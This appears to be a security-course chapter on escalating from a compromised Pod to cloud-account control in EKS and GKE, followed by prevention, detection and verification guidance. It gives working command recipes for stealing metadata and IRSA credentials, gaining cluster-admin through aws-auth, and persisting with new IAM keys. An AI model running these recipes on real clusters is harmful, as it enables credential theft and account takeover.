# GKE and EKS Attack Paths

## 1. Overview

Managed Kubernetes services (EKS, GKE, AKS) move the control plane under the cloud provider's responsibility but leave the identity integration, node configuration, and network exposure to the customer. The result is a distinct attack surface: the cluster API server is still reachable, but the highest-impact escalation path is usually through the cloud IAM role attached to a workload or a node.

This file covers the two most common managed services in offensive engagements:

- **Amazon EKS** - IAM Roles for Service Accounts (IRSA), EKS Pod Identity, IMDS from Pods, node instance roles.
- **Google GKE** - Workload Identity, metadata concealment, GKE Sandbox, Autopilot.

Azure AKS is covered in `02 Azure/` and briefly in `10 Production Notes` here.

The generic Kubernetes paths (RBAC abuse, privileged Pods, container escape) are in `02 Kubernetes Attack Surface.md` and `03 Container Escape.md`. This file focuses on the cloud-specific escalation that turns a Pod compromise into cloud account compromise.

## 2. Reconnaissance and Enumeration

From inside a compromised Pod, the first question is: what cloud am I in, and what identity do I have?

Provider detection:

```bash
# AWS
curl -s -m 2 http://169.254.169.254/latest/meta-data/instance-id && echo "AWS"

# GCP
curl -s -m 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/id && echo "GCP"

# Azure
curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" && echo "Azure"
```

Expected output (AWS):

```text
i-0abc123def4567890
AWS
```

EKS identity enumeration:

```bash
# IRSA: token file injected by the EKS pod identity webhook
ls -la /var/run/secrets/eks.amazonaws.com/serviceaccount/token
export AWS_ROLE_ARN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/..data/role-arn 2>/dev/null)
export AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Who am I in AWS?
aws sts get-caller-identity
```

Expected output:

```text
{
    "UserId": "AROAABCDEFGHIJKLMNOPQ:botocore-session-1234567890",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/eks-app-role/botocore-session-1234567890"
}
```

GKE identity enumeration:

```bash
# Workload Identity: token from the GKE metadata server
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Expected output:

```text
{"access_token":"ya29.c.b0AX...","expires_in":3599,"token_type":"Bearer"}
```

Kubernetes identity enumeration (same on both):

```bash
kubectl auth can-i --list
kubectl get sa -A
```

IMDS reachability check (EKS):

```bash
curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

If this returns a role name, the Pod can steal the node's instance role - a common EKS misconfiguration.

## 3. Common Attack Vectors

**3.1 EKS: IRSA misconfiguration**

IRSA maps a Kubernetes ServiceAccount to an IAM role via a trust policy. The trust policy must scope `sub` to a specific namespace and ServiceAccount (`system:serviceaccount:prod:app`). A wildcard `sub` (`system:serviceaccount:*:*`) lets any Pod in the cluster assume the role.

Attack path:

1. Compromise any Pod that can read its own projected token (all Pods by default).
2. If the trust policy has a wildcard `sub`, exchange the token for the role's AWS credentials via STS.
3. Use the credentials to enumerate AWS (`aws sts get-caller-identity`, `aws iam list-attached-role-policies`).

**3.2 EKS: IMDS from Pods**

By default, EKS Pods can reach the EC2 instance metadata service (`169.254.169.254`). If IMDSv1 is enabled, a simple `curl` returns the node's instance role credentials.

Attack path:

1. `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
2. `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`.
3. Use the `AccessKeyId`, `SecretAccessKey`, `Token` with the AWS CLI.

IMDSv2 requires a `PUT` to obtain a session token first, but is still reachable unless blocked.

**3.3 EKS: node instance role**

The node's instance role (attached via the EKS node group) is more permissive than most workload roles. It typically has `ec2:Describe*`, `ecr:*`, `eks:Describe*`, and sometimes `s3:*`.

Attack path:

1. Reach IMDS from a Pod (Recipe 4 in `01 Kubernetes Fundamentals.md`).
2. Assume the node role.
3. Enumerate ECR repositories and pull private images for secrets; enumerate S3 buckets for data.

**3.4 EKS: aws-auth ConfigMap**

The `aws-auth` ConfigMap in `kube-system` maps IAM roles and users to Kubernetes RBAC. A user with `edit` on that ConfigMap can add `system:masters` to any IAM role, escalating to cluster-admin.

Attack path:

1. Obtain `edit` or `update` on `configmaps` in `kube-system`.
2. Add a mapping from an IAM role you control to `system:masters`.
3. Assume that IAM role (via IRSA or STS) and use `kubectl` with `system:masters` privileges.

**3.5 GKE: Workload Identity misconfiguration**

Workload Identity binds a Kubernetes ServiceAccount to a Google Service Account (GSA) via an IAM binding. If the binding is too broad (any KSA in any namespace), any Pod can impersonate the GSA.

Attack path:

1. Compromise a Pod.
2. Request a token from the GKE metadata server (`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`).
3. If the KSA is bound to a privileged GSA, use the token with `gcloud auth activate-service-account --access-token-file` or the REST API.

**3.6 GKE: metadata concealment misconfiguration**

GKE's "metadata concealment" hides the node's service account from Pods. If disabled, a Pod can query the node's metadata server for the node's default service account token, which may have broad GCP permissions.

**3.7 GKE: Autopilot vs Standard**

GKE Autopilot enforces Pod Security Standards and blocks privileged Pods, hostPath, and hostNetwork. GKE Standard does not enforce these by default - the same escape paths as a self-managed cluster apply.

**3.8 GKE: GKE Sandbox (gVisor)**

GKE Sandbox runs untrusted workloads in gVisor, which intercepts syscalls in user space. This blocks most kernel exploits but not configuration escapes (privileged Pods are still privileged inside gVisor). A gVisor container that reaches a mounted runtime socket can still escape.

## 4. Exploitation Recipes

**Recipe 1 - EKS IRSA token to AWS credentials:**

```bash
TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
ROLE_ARN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/..data/role-arn)

CREDS=$(aws sts assume-role-with-web-identity \
  --role-arn $ROLE_ARN \
  --role-session-name escape \
  --web-identity-token $TOKEN \
  --query 'Credentials' --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')

aws sts get-caller-identity
```

Expected output:

```text
{
    "UserId": "AROAABCDEFGHIJKLMNOPQ:escape",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/eks-app-role/escape"
}
```

**Recipe 2 - EKS IMDS to node role credentials:**

```bash
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | jq .
```

Expected output:

```text
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-10-22T12:00:00Z"
}
```

**Recipe 3 - GKE Workload Identity token to GCP API:**

```bash
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r '.access_token')

# Who am I?
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN"

# List storage buckets
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>"
```

Expected output:

```text
{
  "azp": "123456789012-compute@developer.gserviceaccount.com",
  "aud": "123456789012",
  "scope": "https://www.googleapis.com/auth/cloud-platform",
  "expires_in": 3599
}
```

**Recipe 4 - EKS aws-auth ConfigMap to cluster-admin:**

```bash
kubectl -n kube-system get configmap aws-auth -o yaml > aws-auth.yaml
# Edit: add a mapRoles entry with groups: ["system:masters"] for your IAM role
kubectl -n kube-system apply -f aws-auth.yaml
```

Expected output:

```text
configmap/aws-auth configured
```

**Recipe 5 - GKE Autopilot vs Standard detection:**

```bash
# Autopilot annotation appears on the cluster, not the Pod; check node labels
kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.labels.cloud\.google\.com/gke-nodepool}{"\n"}{end}'
```

Expected output:

```text
gke-cluster-default-pool-abc123 default-pool
```

## 5. Post-Exploitation

Once AWS or GCP credentials are obtained:

AWS:

- `aws sts get-caller-identity` - who am I.
- `aws iam list-attached-role-policies --role-name <role>` - role permissions.
- `aws s3 ls` - bucket enumeration.
- `aws ecr describe-repositories` - private container images.
- `aws secretsmanager list-secrets` - secrets.
- `aws ssm describe-parameters` - SSM parameters (often contain secrets).
- `aws ec2 describe-instances` - other nodes, other regions.

GCP:

- `gcloud auth list` - active accounts.
- `gcloud projects list` - projects the account can see.
- `gcloud storage buckets list` - buckets.
- `gcloud secrets list` - Secret Manager.
- `gcloud compute instances list` - other VMs.
- `gcloud container clusters list` - other GKE clusters.

Persistence:

- AWS: create a new IAM user with an access key (if `iam:CreateUser` and `iam:CreateAccessKey` are allowed). Create a new IRSA role with a trust policy pointing to a ServiceAccount you control.
- GCP: create a new service account key (if `iam.serviceAccountKeys.create` is allowed). Create a new Workload Identity binding.

## 6. Preventive Controls

EKS:

- Scope IRSA trust policies to specific namespace and ServiceAccount (`system:serviceaccount:prod:app`), never `*`.
- Block IMDS from Pods: NetworkPolicy egress deny to `169.254.169.254/32`, or IMDSv2 with `HttpPutResponseHopLimit: 1`.
- Restrict `aws-auth` ConfigMap write access to cluster-admin only.
- Use EKS Pod Identity (2023) instead of IRSA where possible; it avoids long-lived token files.
- Enable EKS audit logging to CloudWatch.
- Enable GuardDuty EKS Runtime Monitoring.
- Use Bottlerocket nodes (no SSH, no Docker socket by default).

GKE:

- Scope Workload Identity bindings to specific KSA + namespace.
- Enable Workload Identity on all node pools.
- Enable metadata concealment on Standard clusters.
- Use GKE Autopilot or enforce PSA `restricted` on Standard.
- Enable GKE Sandbox for untrusted workloads.
- Enable GKE audit logging and Security Command Center.
- Use private clusters (no public control plane endpoint).

Both:

- Enable cloud-native threat detection (GuardDuty, SCC, Defender).
- Rotate node instance roles regularly and scope them to the minimum.
- Audit IAM roles attached to nodes and workloads every quarter.

## 7. Detection Controls

EKS signals:

- GuardDuty finding `PrivilegeEscalation:Kubernetes/PrivilegedContainer`.
- GuardDuty finding `CredentialAccess:IAMUser/AnomalousBehavior`.
- CloudTrail `AssumeRoleWithWebIdentity` from an unexpected source IP.
- CloudTrail `GetSecretValue` spikes from a single role.
- EKS audit log `create` on `pods/exec` into `kube-system`.

GKE signals:

- SCC finding `Privileged Container`.
- SCC finding `Container Escape`.
- Cloud Audit Log `google.cloud.container.v1.ClusterManager` from an unexpected principal.
- Cloud Audit Log `storage.objects.get` spikes from a workload service account.
- GKE audit log `pods/exec` into `kube-system`.

General:

- Falco rule `AWS IMDS Access from Pod`.
- Falco rule `GCP Metadata Access from Pod`.
- Tetragon trace on `connect` to `169.254.169.254` or `metadata.google.internal`.

## 8. Verification

EKS:

- From a Pod: `curl -s -m 2 http://169.254.169.254/latest/meta-data/` should time out.
- IRSA trust policy: `aws iam get-role --role-name <role> --query 'Role.AssumeRolePolicyDocument'` should show a scoped `sub`.
- `aws-auth` ConfigMap: only `system:masters` group should be present; no unexpected IAM principals.

GKE:

- From a Pod: `curl -s -m 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/` should only list the expected service account.
- Workload Identity binding: `gcloud iam service-accounts get-iam-policy <gsa>` should only include the expected KSA.
- GKE cluster: `gcloud container clusters describe <cluster> --format='value(privateClusterConfig)'` should show a private endpoint.

## 9. Cloud-Specific Considerations

EKS:

- EKS Fargate Pods do not have IMDS access (no node), but they still receive IRSA tokens.
- EKS on Outposts has different networking; IMDS may be reachable from Pods.
- EKS Anywhere (on-prem) does not use IRSA; IAM integration is manual.

GKE:

- GKE Autopilot blocks privileged Pods, hostPath, and hostNetwork by default - the escape surface is much smaller.
- GKE Standard with `--enable-autopilot` is a migration path, not the same as an Autopilot cluster.
- GKE on-prem (Anthos) uses a different identity model.

## 10. Production Notes

- The single highest-impact EKS misconfiguration is a wildcard IRSA trust policy. Audit every role with `aws iam list-roles` and check `AssumeRolePolicyDocument` for `system:serviceaccount:*:*`.
- The single highest-impact GKE misconfiguration is a Workload Identity binding that allows any KSA in the cluster to impersonate a privileged GSA.
- IMDS from Pods is not a bug; it is the default on EKS. Block it with NetworkPolicy or IMDSv2 hop limit.
- Node instance roles are usually more permissive than workload roles. Scope them tightly; the node does not need `s3:*`.
- After a compromise, rotate all IAM credentials attached to the cluster and its nodes.

## 11. References

- EKS IRSA documentation - https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html
- EKS Pod Identity - https://docs.aws.amazon.com/eks/latest/userguide/pod-identities.html
- EKS best practices - security - https://aws.github.io/aws-eks-best-practices/security/docs/
- EKS aws-auth ConfigMap - https://docs.aws.amazon.com/eks/latest/userguide/auth-configmap.html
- GKE Workload Identity - https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity
- GKE metadata concealment - https://cloud.google.com/kubernetes-engine/docs/how-to/protecting-cluster-metadata
- GKE Sandbox - https://cloud.google.com/kubernetes-engine/docs/concepts/sandbox-pods
- GKE Autopilot - https://cloud.google.com/kubernetes-engine/docs/concepts/autopilot-overview
- AWS GuardDuty EKS Runtime Monitoring - https://docs.aws.amazon.com/guardduty/latest/ug/eks-protection.html
- GCP Security Command Center - https://cloud.google.com/security-command-center/docs

## Certification Alignment

- CKS (Certified Kubernetes Security Specialist) - cluster hardening, supply chain security.
- CKA (Certified Kubernetes Administrator) - cluster configuration.
- AWS Certified Security - Specialty - IRSA, IAM, IMDS.
- AWS Certified Solutions Architect - Associate - EKS networking, IAM.
- Google Cloud Professional Cloud Security Engineer - Workload Identity, GKE security.
- Google Cloud Associate Cloud Engineer - GKE fundamentals.
- CompTIA Security+ - cloud security fundamentals.
